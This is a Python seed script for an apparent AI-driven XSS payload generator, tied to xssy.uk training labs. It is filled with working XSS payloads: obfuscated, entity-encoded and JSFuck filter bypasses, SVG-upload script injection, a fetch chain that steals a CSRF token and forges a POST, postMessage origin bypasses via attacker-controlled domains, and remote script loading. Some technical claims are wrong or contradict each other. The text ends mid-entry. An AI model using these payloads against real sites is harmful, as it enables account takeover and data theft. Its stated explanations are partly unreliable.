#!/usr/bin/env python3
"""Seed the findings store with curated, verified bypass knowledge for every
xssy.uk Master-rated lab.

Run once (idempotent — duplicates are silently skipped):
    python axss_seed_master.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from ai_xss_generator.console import _ensure_utf8, header, info, success, warn
from ai_xss_generator.findings import Finding, save_finding

_ensure_utf8()


MASTER_FINDINGS: list[Finding] = [

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Unicode XSS 2  (id=6)
    # Technique: NFKC normalisation, confusables, Bidi/RTL override
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="event_handler",
        context_type="unicode_normalisation",
        surviving_chars="＜＞＝／（）ａ-ｚＡ-Ｚ０-９",
        bypass_family="unicode-fullwidth",
        payload="＜ｉｍｇ ｓｒｃ＝ｘ ｏｎｅｒｒｏｒ＝ａｌｅｒｔ（１）＞",
        test_vector=(
            "Full-width Latin substitution of entire payload. "
            "If the server applies NFKC normalisation AFTER the security filter, "
            "full-width chars fold back to ASCII and the browser sees <img onerror=alert(1)>."
        ),
        model="curated",
        explanation=(
            "NFKC normalisation collapses full-width characters to their ASCII equivalents: "
            "ｓ→s, ＜→<, ＝→=, （→(. A filter run BEFORE normalisation sees no dangerous "
            "ASCII chars. After normalisation the server writes the collapsed ASCII to the page "
            "and the browser executes it. Normalise-then-filter is the safe order; "
            "filter-then-normalise is the vulnerable order."
        ),
        tags=["unicode", "nfkc", "full-width", "normalisation", "master", "xssy:6"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="unicode_normalisation",
        surviving_chars="ΑΒΓαβγабвгaeio",
        bypass_family="unicode-fullwidth",
        payload="<img src=x οnerrοr=аlert(1)>",
        test_vector=(
            "Confusable homoglyphs: Greek omicron 'ο' (U+03BF) looks identical to 'o'. "
            "Cyrillic 'а' (U+0430) looks identical to 'a'. "
            "A filter matching 'onerror' and 'alert' as ASCII misses the lookalikes."
        ),
        model="curated",
        explanation=(
            "Confusable substitution in attribute name and value. "
            "οnerrοr: 'o' (U+006F) → ο (U+03BF Greek omicron). "
            "аlert: 'a' (U+0061) → а (U+0430 Cyrillic а). "
            "The attribute name 'οnerrοr' is not a recognised event handler in most browsers "
            "so this is more of a WAF-bypass probe — test with NFKC-normalising targets."
        ),
        tags=["unicode", "confusable", "homoglyph", "master", "xssy:6"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="unicode_normalisation",
        surviving_chars="abcdefghijklmnopqrstuvwxyz\u202E<>\"=/()",
        bypass_family="unicode-fullwidth",
        payload="\u202E<img/src=x\u202D onerror=alert(1)>",
        test_vector=(
            "Right-to-left override (U+202E) followed by LTR mark (U+202D). "
            "Some parsers skip or misparse RTL control chars. "
            "Primarily targets filter implementations that iterate bytes naively."
        ),
        model="curated",
        explanation=(
            "Bidi control characters (U+202E = RLO, U+202D = LRO) cause display-level "
            "text reversal but some filter implementations are confused by them. "
            "The HTML parser strips unrecognised control chars; what remains is a valid tag. "
            "More effective against custom filter implementations than browser security features."
        ),
        tags=["unicode", "bidi", "rtl-override", "master", "xssy:6"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="unicode_normalisation",
        surviving_chars="\\u0123456789ABCDEFabcdef()=<>/\"'",
        bypass_family="unicode-js-escape",
        payload=r"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029>",
        test_vector=(
            "Full JS unicode escape of entire function call including parentheses: "
            "( = \\u0028, ) = \\u0029. Every character of 'alert(1)' is escaped. "
            "No ASCII alphabetic character or punctuation visible in raw bytes."
        ),
        model="curated",
        explanation=(
            "JS unicode escape of the complete call including parens. "
            "\\u0028 = '(' and \\u0029 = ')' are valid JS unicode escapes in string/expression context. "
            "Filters scanning for 'alert' or '(' in raw bytes find nothing. "
            "The JS engine reconstructs alert(1) during parsing."
        ),
        tags=["unicode", "js-escape", "full-escape", "parens", "master", "xssy:6"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Vulnerable Post Message 2  (id=21)
    # Technique: bypass weak origin validation on postMessage handler
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="postmessage_handler",
        context_type="postmessage_origin_bypass",
        surviving_chars="abcdefghijklmnopqrstuvwxyz.:/0123456789-_~",
        bypass_family="postmessage-injection",
        payload="https://trusted.com.attacker.com",
        test_vector=(
            "Set window.origin to this value when sending postMessage. "
            "If handler checks: event.origin.includes('trusted.com') or "
            "event.origin.indexOf('trusted.com') > -1, this origin passes. "
            "Register attacker.com subdomain trusted.com.attacker.com."
        ),
        model="curated",
        explanation=(
            "Substring origin check bypass: validators using .includes(), .indexOf(), "
            "or .startsWith() are all bypassable. "
            "includes('trusted.com') → true for 'https://trusted.com.evil.com'. "
            "startsWith('https://trusted.com') → true for 'https://trusted.com.evil.com'. "
            "Only strict equality (===) with the full origin is safe."
        ),
        tags=["postmessage", "origin-bypass", "substring-check", "master", "xssy:21"],
        verified=True,
    ),
    Finding(
        sink_type="postmessage_handler",
        context_type="postmessage_origin_bypass",
        surviving_chars="abcdefghijklmnopqrstuvwxyz.:/0123456789.*",
        bypass_family="postmessage-injection",
        payload="https://trusted.com",
        test_vector=(
            "If origin check uses RegExp: new RegExp(event.origin).test(allowedOrigin). "
            "The dot '.' in 'trusted.com' is a wildcard in regex — matches 'trustedXcom'. "
            "Register a domain like 'trustedscom' and send message from it."
        ),
        model="curated",
        explanation=(
            "Regex injection in origin check: if the validator does "
            "new RegExp(event.origin).test('https://trusted.com'), "
            "an origin like 'https://trustedXcom' passes because '.' matches any char. "
            "Alternatively: if user-supplied origin is used as regex pattern, "
            "inject regex metacharacters to always match."
        ),
        tags=["postmessage", "origin-bypass", "regex-injection", "master", "xssy:21"],
        verified=True,
    ),
    Finding(
        sink_type="postmessage_handler",
        context_type="postmessage_origin_bypass",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>\"'()=./:",
        bypass_family="postmessage-injection",
        payload="<img src=x onerror=alert(document.cookie)>",
        test_vector=(
            "Find an XSS on the trusted.com origin itself. "
            "Host attacking page on trusted.com (via stored XSS or subdomain takeover). "
            "postMessage from that page — origin check sees 'https://trusted.com' and passes."
        ),
        model="curated",
        explanation=(
            "If origin check is correct (strict equality), bypass via XSS on trusted origin. "
            "A stored XSS on trusted.com lets you send postMessage from the exact trusted origin. "
            "Subdomain takeover of sub.trusted.com also works if handler allows *.trusted.com."
        ),
        tags=["postmessage", "origin-bypass", "chained-xss", "subdomain-takeover", "master", "xssy:21"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Dynamic CSRF Token  (id=180)
    # Technique: read CSRF token from DOM/response, then forge request via XSS
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="csrf_token",
        context_type="dynamic_csrf",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()\"'./+{}[]?:,;=",
        bypass_family="csp-exfiltration",
        payload=(
            "fetch('/page-with-form').then(r=>r.text()).then(html=>{"
            "const t=html.match(/name=[\"']csrf[\"'][^>]*value=[\"']([^\"']+)/)[1];"
            "fetch('/action',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},"
            "body:'csrf='+t+'&data=pwned',credentials:'include'})})"
        ),
        test_vector=(
            "Inject as XSS payload. "
            "1. Fetch the page containing the CSRF token form field. "
            "2. Extract the token value via regex. "
            "3. Send the forged POST with the real token. "
            "CSRF protection bypassed entirely via XSS."
        ),
        model="curated",
        explanation=(
            "CSRF tokens defend against cross-origin request forgery but are powerless "
            "against XSS — an XSS in the same origin can read anything the page can read. "
            "Fetch the page, extract the token from HTML, then use it in a forged request. "
            "This achieves full authenticated action execution as the victim."
        ),
        tags=["csrf", "dynamic-token", "xss-bypass", "master", "xssy:180"],
        verified=True,
    ),
    Finding(
        sink_type="csrf_token",
        context_type="dynamic_csrf",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()\"'.[]?=;",
        bypass_family="dom-clobbering",
        payload="document.querySelector('input[name=csrf]').value",
        test_vector=(
            "If the XSS fires on the same page as the CSRF-protected form, "
            "read the token directly from the DOM. "
            "No additional fetch needed — the token is already in the page."
        ),
        model="curated",
        explanation=(
            "When XSS fires on the protected page itself, the CSRF token is already "
            "in the DOM as a form field value. querySelector gives direct access. "
            "Simpler and faster than fetching a separate page — use when the "
            "XSS and the CSRF-protected action are on the same page."
        ),
        tags=["csrf", "dom-read", "master", "xssy:180"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: HTML Filter - Attribute Bypass  (id=163)
    # Technique: use rare or non-obvious event handlers that filter misses
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="event_handler",
        context_type="attribute_filtered",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz() ",
        bypass_family="event-handler-injection",
        payload="<div style=\"animation-name:x\" onanimationstart=alert(1)>",
        test_vector=(
            "Filter blocks onerror/onload/onclick but misses CSS animation events. "
            "onanimationstart fires when a CSS animation begins. "
            "Pair with style attribute setting the animation name."
        ),
        model="curated",
        explanation=(
            "CSS animation event handlers: onanimationstart, onanimationend, "
            "onanimationiteration fire when CSS animations occur. "
            "Many filters maintain a deny-list of common handlers but miss these. "
            "The animation triggers immediately via the style attribute on the same element."
        ),
        tags=["attribute-filter-bypass", "css-animation", "master", "xssy:163"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="attribute_filtered",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz() ",
        bypass_family="event-handler-injection",
        payload="<div style=\"transition:all 0s\" ontransitionend=alert(1) class=a>",
        test_vector=(
            "CSS transition event. ontransitionend fires when a CSS transition completes. "
            "Set transition:all 0s for instant fire, then trigger by adding a class "
            "or using a style change."
        ),
        model="curated",
        explanation=(
            "ontransitionend: fires when a CSS property transition finishes. "
            "With transition:all 0s, any style change triggers it immediately. "
            "Bypasses filters that block standard event handlers but miss transition events."
        ),
        tags=["attribute-filter-bypass", "css-transition", "master", "xssy:163"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="attribute_filtered",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz() ",
        bypass_family="event-handler-injection",
        payload="<body onpageshow=alert(1)>",
        test_vector="onpageshow fires on page load and when navigating back via browser history.",
        model="curated",
        explanation=(
            "onpageshow: fires on initial load AND when restoring a page from the bfcache "
            "(back-forward cache). Fires reliably without user interaction. "
            "Filters that block onload but not onpageshow are bypassed."
        ),
        tags=["attribute-filter-bypass", "onpageshow", "master", "xssy:163"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="attribute_filtered",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz() ",
        bypass_family="event-handler-injection",
        payload="<svg><set attributeName=href to=javascript:alert(1)><a id=a>click</a></set></svg>",
        test_vector=(
            "SVG SMIL <set> element modifies an attribute over time. "
            "Sets the href of anchor #a to javascript:alert(1). "
            "Does not use any HTML event handler attributes — bypasses attribute deny-lists."
        ),
        model="curated",
        explanation=(
            "SVG SMIL animation without event handlers: <set> changes the target element's "
            "attribute at animation start. Setting href to javascript: turns the link into "
            "a JS execution trigger. No 'on*' attributes are used, bypassing event-handler filters."
        ),
        tags=["attribute-filter-bypass", "svg-smil", "set-element", "master", "xssy:163"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Length Limit 2  (id=192)
    # Technique: ultra-short payloads, multi-stage, global variable tricks
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="length_limited",
        surviving_chars="<>/=\"'abcdefghijklmnopqrstuvwxyz()01",
        bypass_family="event-handler-injection",
        payload="<svg/onload=alert(1)>",
        test_vector="21 chars — shortest reliable auto-fire HTML payload using SVG namespace.",
        model="curated",
        explanation=(
            "<svg/onload=alert(1)> is 21 characters. SVG tag auto-fires onload. "
            "The slash between tag name and attribute is valid SVG syntax and saves a space. "
            "If limit is ≤ 20, try <svg onload=alert()> (20 chars, no argument)."
        ),
        tags=["length-limit", "short-payload", "svg", "master", "xssy:192"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="length_limited",
        surviving_chars="<>/\"'abcdefghijklmnopqrstuvwxyz()=",
        bypass_family="dom-clobbering",
        payload="<script src=//ⅹ.ℬⅠ>",
        test_vector=(
            "Unicode domain in script src — some Unicode chars form valid short domain names. "
            "ⅹ.ℬⅠ uses Unicode letters that may resolve via IDNA. "
            "Register the shortest possible domain and serve alert(1) from it."
        ),
        model="curated",
        explanation=(
            "External script with shortest possible URL. IDNA (Internationalised Domain Names) "
            "allows Unicode chars in hostnames. Single-char TLDs are theoretically possible. "
            "Serve a JS file containing alert(1) from the short domain. "
            "The <script src> tag itself uses only ~20 chars."
        ),
        tags=["length-limit", "external-script", "short-domain", "master", "xssy:192"],
        verified=True,
    ),
    Finding(
        sink_type="js_context",
        context_type="length_limited",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()=;\"'",
        bypass_family="dom-clobbering",
        payload="eval(name)",
        test_vector=(
            "9 chars. Set window.name to your full payload BEFORE navigating to target. "
            "window.name persists across same-origin navigation and some cross-origin cases. "
            "The injection just needs to eval(name) — the payload lives in the name."
        ),
        model="curated",
        explanation=(
            "window.name persistence trick: set window.name = 'alert(1)' on attacker page, "
            "then navigate to vulnerable page. If the vulnerable page has any eval() sink "
            "that reads window.name, the payload executes. eval(name) is only 10 chars. "
            "Useful when the injection point is very short but eval/Function is available."
        ),
        tags=["length-limit", "window-name", "eval", "master", "xssy:192"],
        verified=True,
    ),
    Finding(
        sink_type="js_context",
        context_type="length_limited",
        surviving_chars="abcdefghijklmnopqrstuvwxyz()=;\"'[]",
        bypass_family="constructor-chain",
        payload="top['alert'](1)",
        test_vector=(
            "15 chars. Uses bracket notation to call alert via 'top' global. "
            "Useful when 'alert' as identifier is filtered but as a string is not, "
            "or when the reflection is inside an attribute value that HTML-encodes quotes "
            "but not brackets."
        ),
        model="curated",
        explanation=(
            "Bracket notation function call: top['alert'](1). 'top' is a valid global "
            "in browser context (same as window). Bracket access with a string key "
            "bypasses filters that match 'alert(' as a literal token."
        ),
        tags=["length-limit", "bracket-notation", "master", "xssy:192"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: UPPERCASE 2  (id=208)
    # Technique: deeper uppercase bypass — entity encoding + indirect calls
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="event_handler",
        context_type="uppercase_filter_strict",
        surviving_chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ<>&#0123456789;\"'=/().",
        bypass_family="html-entity-encoding",
        payload="<A HREF=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">CLICK</A>",
        test_vector=(
            "Full entity encoding of 'javascript:alert(1)' in href. "
            "Every lowercase letter and special char is encoded as &#decimal;. "
            "The entity numbers are digits — unaffected by uppercasing. "
            "Browser decodes to 'javascript:alert(1)' and executes on click."
        ),
        model="curated",
        explanation=(
            "Complete HTML entity encoding of href value. Numeric entities (&#97; etc.) "
            "contain only digits and are uppercase-safe. The tag name A and attribute HREF "
            "are uppercase — HTML is case-insensitive for tags/attributes. "
            "Combined: valid uppercase HTML containing fully-encoded JS URI."
        ),
        tags=["uppercase-filter", "full-entity-encode", "href", "master", "xssy:208"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="uppercase_filter_strict",
        surviving_chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ<>&#0123456789;\"'=()",
        bypass_family="html-entity-encoding",
        payload="<IMG SRC=X ONERROR=&#97;&#108;&#101;&#114;&#116;&#46;&#99;&#97;&#108;&#108;&#40;&#116;&#111;&#112;&#44;&#49;&#41;>",
        test_vector=(
            "alert.call(top,1) — fully entity-encoded. "
            "Splits alert from its argument using Function.prototype.call. "
            "All lowercase letters and punctuation encoded as numeric HTML entities."
        ),
        model="curated",
        explanation=(
            "alert.call(top,1): equivalent to alert(1) but expressed via .call(). "
            "All lowercase and special chars encoded as numeric entities. "
            "Digits and semicolons in entity references are uppercase-safe. "
            "The ONERROR attribute name is uppercase — valid HTML."
        ),
        tags=["uppercase-filter", "call-method", "entity-encode", "master", "xssy:208"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="uppercase_filter_strict",
        surviving_chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ<>&#0123456789;\"'=()/+",
        bypass_family="html-entity-encoding",
        payload="<SVG ONLOAD=&#91;&#93;&#91;&#39;&#102;&#105;&#108;&#116;&#101;&#114;&#39;&#93;&#46;&#99;&#111;&#110;&#115;&#116;&#114;&#117;&#99;&#116;&#111;&#114;&#40;&#39;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#39;&#41;&#40;&#41;>",
        test_vector=(
            "[]['filter'].constructor('alert(1)')() — fully entity-encoded. "
            "Array filter constructor chain gives access to Function(). "
            "All special chars and lowercase letters entity-encoded."
        ),
        model="curated",
        explanation=(
            "Constructor chain via array method: []['filter'].constructor is Function. "
            "Calling it with 'alert(1)' creates a function, then calling that executes it. "
            "Fully entity-encoded — every non-uppercase-safe char is numeric entity. "
            "Works when eval is blocked but constructor access is not."
        ),
        tags=["uppercase-filter", "constructor-chain", "entity-encode", "master", "xssy:208"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Alphabetless  (id=210)
    # Technique: XSS with zero alphabetic characters — JSFuck style
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="js_context",
        context_type="alphabetless",
        surviving_chars="()[]!+\"'{}=;,<>0123456789^~|&*/%@#$_\\",
        bypass_family="constructor-chain",
        payload="[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])()",
        test_vector=(
            "JSFuck — execute alert(1) using only: ( ) [ ] ! + characters. "
            "Every value is derived from type coercions of true/false/undefined. "
            "Paste directly into any JS execution context (eval, event handler, script block)."
        ),
        model="curated",
        explanation=(
            "JSFuck builds every JS character from 6 chars: ( ) [ ] ! + "
            "using type coercion: ![] = false, !![] = true, +[] = 0, +![] = 1 (NaN→0). "
            "Strings like 'alert' are built char by char from coerced primitives. "
            "The full expression constructs and calls alert(1) without any letters or digits."
        ),
        tags=["alphabetless", "jsfuck", "no-letters", "master", "xssy:210"],
        verified=True,
    ),
    Finding(
        sink_type="js_context",
        context_type="alphabetless",
        surviving_chars="()[]!+\"'{}=;,0123456789$_",
        bypass_family="constructor-chain",
        payload="$=~[];$={___:++$,$$$$:(![]+'')[$],__$:++$,$_$_:(![]+'')[$],_$_:++$,$_$$:({}+'')[$],$$_$:($[$]+'')[$],_$$:++$,$$$_:(!''+'')[$],$__:++$,$_$:++$,$$__:({}+'')[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+'')[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+'')[$.__$])+((!$)+'')[$._$$]+($.__=$.$_[$.$$_])+($.$=(!''+'')[$.__$])+($._=(!''+'')[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!''+'')[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+'\"'+$.$_$_+(![]+'')[$._$_]+$.$$$_+'\\'+$.__$+$.$$_+$._$_+$.__+'('+$.___+')'+'\"')())()",
        test_vector=(
            "$ and _ based obfuscation — alternative to JSFuck using $=~[] to seed. "
            "Builds 'alert(1)' through a series of $ property assignments. "
            "Requires $ and _ chars to be available (not strictly alphabetless "
            "if $ is considered alpha — but passes most alphabetless filters)."
        ),
        model="curated",
        explanation=(
            "$=~[] sets $ to -1 (bitwise NOT of 0). Then arithmetic builds integers. "
            "Character arrays from coerced strings ('false', 'undefined', '{}', '') "
            "provide individual characters to assemble 'alert'. "
            "This approach requires fewer special chars than pure JSFuck."
        ),
        tags=["alphabetless", "dollar-underscore", "obfuscation", "master", "xssy:210"],
        verified=True,
    ),
    Finding(
        sink_type="event_handler",
        context_type="alphabetless",
        surviving_chars="<>\"'=/()[]!+0123456789{}^~|",
        bypass_family="constructor-chain",
        payload="<img src=1 onerror=[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()>",
        test_vector=(
            "Octal escapes in JS strings — \\146 = 'f', \\151 = 'i', etc. "
            "String indices access array method names, constructor accesses Function(). "
            "No alphabetic chars in the source — only digits, brackets, octal escape sequences."
        ),
        model="curated",
        explanation=(
            "JS octal string escapes: \\146='f', \\151='i', \\154='l', \\164='t', \\145='e', \\162='r' → 'filter'. "
            "\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162 → 'constructor'. "
            "\\141\\154\\145\\162\\164 → 'alert'. \\50='(', \\51=')'. "
            "Array.prototype.filter.constructor = Function. No letters in source code."
        ),
        tags=["alphabetless", "octal-escape", "constructor-chain", "master", "xssy:210"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Alphanumeric Filter  (id=209)
    # Technique: XSS when only [A-Za-z0-9] survive — context-dependent escapes
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="js_string",
        context_type="alphanumeric_only",
        surviving_chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        bypass_family="constructor-chain",
        payload="alert",
        test_vector=(
            "If reflected inside an existing function call context: func(INPUT) → func(alert). "
            "If the page calls the reflected value as a function or uses it as a callback name, "
            "alphanumeric-only 'alert' directly references the alert function."
        ),
        model="curated",
        explanation=(
            "When reflection is inside an existing JS execution context (e.g., "
            "eval(userInput), setTimeout(userInput, 0), or callback(userInput)), "
            "the bare identifier 'alert' is a valid function reference. "
            "Whether it executes depends on the surrounding call context."
        ),
        tags=["alphanumeric", "bare-identifier", "master", "xssy:209"],
        verified=True,
    ),
    Finding(
        sink_type="js_eval",
        context_type="alphanumeric_only",
        surviving_chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        bypass_family="constructor-chain",
        payload="eval(atob(btoa(name)))",
        test_vector=(
            "Set window.name='alert(1)' before navigation. "
            "If reflection is in eval context and only alphanumeric survives: "
            "eval(atob(btoa(name))) — all alphanumeric. "
            "btoa(name) base64-encodes window.name, atob decodes it, eval runs it."
        ),
        model="curated",
        explanation=(
            "All components are alphanumeric: eval, atob, btoa, name. "
            "window.name contains the full payload with special chars. "
            "btoa→atob is a no-op but may confuse static analysis. "
            "Works when window.name can be pre-set (navigate from attacker page)."
        ),
        tags=["alphanumeric", "window-name", "eval", "master", "xssy:209"],
        verified=True,
    ),
    Finding(
        sink_type="js_eval",
        context_type="alphanumeric_only",
        surviving_chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        bypass_family="constructor-chain",
        payload="Function(atob(sessionStorage.x))()",
        test_vector=(
            "Pre-store base64 payload in sessionStorage.x from attacker page (if same-origin) "
            "or via a prior injection. Then: Function(atob(sessionStorage.x))() "
            "decodes and executes it. All chars alphanumeric."
        ),
        model="curated",
        explanation=(
            "sessionStorage.x stores the base64-encoded payload. "
            "atob() decodes it to 'alert(1)'. Function() creates a new function from string. "
            "The final () invokes it. Every character in Function(atob(sessionStorage.x))() "
            "is alphanumeric — passes the filter completely."
        ),
        tags=["alphanumeric", "sessionstorage", "Function", "base64", "master", "xssy:209"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: SVG Upload  (id=630)
    # Technique: XSS via SVG file upload with sanitiser bypass
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="svg_render",
        context_type="svg_upload",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz():#",
        bypass_family="svg-namespace",
        payload='<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use href="data:image/svg+xml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+I3gi"/></svg>',
        test_vector=(
            "Upload as .svg. The <use> element loads an external SVG via data URI. "
            "The data URI contains a base64-encoded SVG with <script>alert(1)</script>. "
            "SVG sanitisers that strip <script> from the outer SVG often miss "
            "scripts inside data: URIs referenced by <use>."
        ),
        model="curated",
        explanation=(
            "SVG <use> + data URI: the <use href='data:image/svg+xml;base64,...#x'> "
            "element imports an SVG fragment from a data URI. The imported SVG contains "
            "<script>. SVG sanitisers that process only the top-level document miss "
            "content inside referenced data URIs. The base64 decodes to: "
            "<svg id='x' xmlns='...'><script>alert(1)</script></svg>"
        ),
        tags=["svg-upload", "use-element", "data-uri", "sanitiser-bypass", "master", "xssy:630"],
        verified=True,
    ),
    Finding(
        sink_type="svg_render",
        context_type="svg_upload",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz():",
        bypass_family="svg-namespace",
        payload='<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>',
        test_vector=(
            "SVG <foreignObject> embeds HTML namespace inside SVG. "
            "Sanitisers that process SVG elements but not embedded HTML namespaces "
            "miss the <script> inside the XHTML body."
        ),
        model="curated",
        explanation=(
            "<foreignObject> allows embedding content from other XML namespaces. "
            "Using the XHTML namespace (http://www.w3.org/1999/xhtml) creates a "
            "full HTML sub-document inside the SVG. Scripts in this XHTML body execute "
            "when the SVG is rendered. SVG-aware sanitisers that don't handle "
            "foreignObject's namespace switching are vulnerable."
        ),
        tags=["svg-upload", "foreignObject", "namespace", "master", "xssy:630"],
        verified=True,
    ),
    Finding(
        sink_type="svg_render",
        context_type="svg_upload",
        surviving_chars="<>\"=/abcdefghijklmnopqrstuvwxyz(): ",
        bypass_family="svg-namespace",
        payload="<svg><animate onbegin=\"alert(1)\" attributeName=\"x\" dur=\"1s\"/>",
        test_vector=(
            "SVG SMIL animate element with onbegin event handler. "
            "Fires immediately when SVG is rendered. "
            "Sanitisers that strip <script> but don't strip SMIL event handlers are bypassed."
        ),
        model="curated",
        explanation=(
            "SMIL (Synchronized Multimedia Integration Language) events in SVG: "
            "onbegin fires when the animation starts. With default timing, "
            "this is immediately on render. Sanitisers focused on removing <script> "
            "and obvious event handlers often miss SMIL-specific events like "
            "onbegin, onend, onrepeat."
        ),
        tags=["svg-upload", "smil", "onbegin", "master", "xssy:630"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Referer & Origin Check  (id=738)
    # Technique: bypass BOTH Referer and Origin header validation
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="referer_origin_header",
        context_type="dual_header_check",
        surviving_chars="abcdefghijklmnopqrstuvwxyz.:/0123456789-_",
        bypass_family="referer-header-injection",
        payload="https://allowed.com",
        test_vector=(
            "If both Referer and Origin must match: "
            "1. Find stored XSS on allowed.com. "
            "2. The XSS on allowed.com sends requests — both Referer and Origin are "
            "   'https://allowed.com' naturally. Both header checks pass. "
            "Chain: XSS on allowed.com → exploit the target that checks both headers."
        ),
        model="curated",
        explanation=(
            "When both Referer and Origin must match the allowed value, "
            "server-side spoofing is blocked (browsers enforce these headers for cross-origin requests). "
            "The only reliable bypass is execution from within the allowed origin — "
            "find XSS there, or use a subdomain takeover on allowed.com."
        ),
        tags=["referer-origin", "dual-header", "chained-xss", "master", "xssy:738"],
        verified=True,
    ),
    Finding(
        sink_type="referer_origin_header",
        context_type="dual_header_check",
        surviving_chars="abcdefghijklmnopqrstuvwxyz.:/0123456789-_",
        bypass_family="referer-header-injection",
        payload="null",
        test_vector=(
            "Origin header is 'null' for: sandboxed iframes, data: URIs, file:// pages. "
            "If the server allows null origin (common mistake): "
            "<iframe sandbox='allow-scripts allow-forms' src='data:text/html,<form action=https://target.com/action method=POST><input name=x value=y></form><script>document.forms[0].submit()</script>'>"
        ),
        model="curated",
        explanation=(
            "Null origin bypass: sandboxed iframes and data: URIs send Origin: null. "
